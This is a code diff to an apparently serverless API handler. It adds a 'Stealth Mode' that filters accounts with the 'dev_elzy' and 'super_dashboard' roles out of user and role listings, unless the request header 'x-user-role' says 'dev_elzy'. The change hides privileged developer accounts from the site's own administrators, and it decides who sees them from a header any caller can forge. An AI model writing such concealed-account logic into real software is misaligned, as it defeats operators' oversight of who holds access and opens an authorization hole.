@@ -49,9 +49,27 @@ async function syncToAttendance(db, body) {
     }
 }
 
-export async function handleGetData(db, type) {
+export async function handleGetData(request, db, type) {
     if (!type || !HEADERS_CONFIG[type]) return Response.json({ error: "Invalid type" }, { status: 400 });
-    const { results } = await db.prepare(`SELECT * FROM "${type}" ORDER BY id DESC`).all();
+
+    const operatorRole = request.headers.get('x-user-role');
+
+    // 🛡️ SECURITY: Stealth Mode for Develzy
+    // Only 'dev_elzy' can see 'dev_elzy' and 'super_dashboard' entities
+    let query = `SELECT * FROM "${type}"`;
+    const params = [];
+
+    if (operatorRole !== 'dev_elzy') {
+        if (type === 'users') {
+            query += ` WHERE role != 'dev_elzy' AND role != 'super_dashboard'`;
+        } else if (type === 'roles') {
+            query += ` WHERE role != 'dev_elzy' AND role != 'super_dashboard'`;
+        }
+    }
+
+    query += ` ORDER BY id DESC`;
+
+    const { results } = await db.prepare(query).bind(...params).all();
     return Response.json(results || []);
 }
 
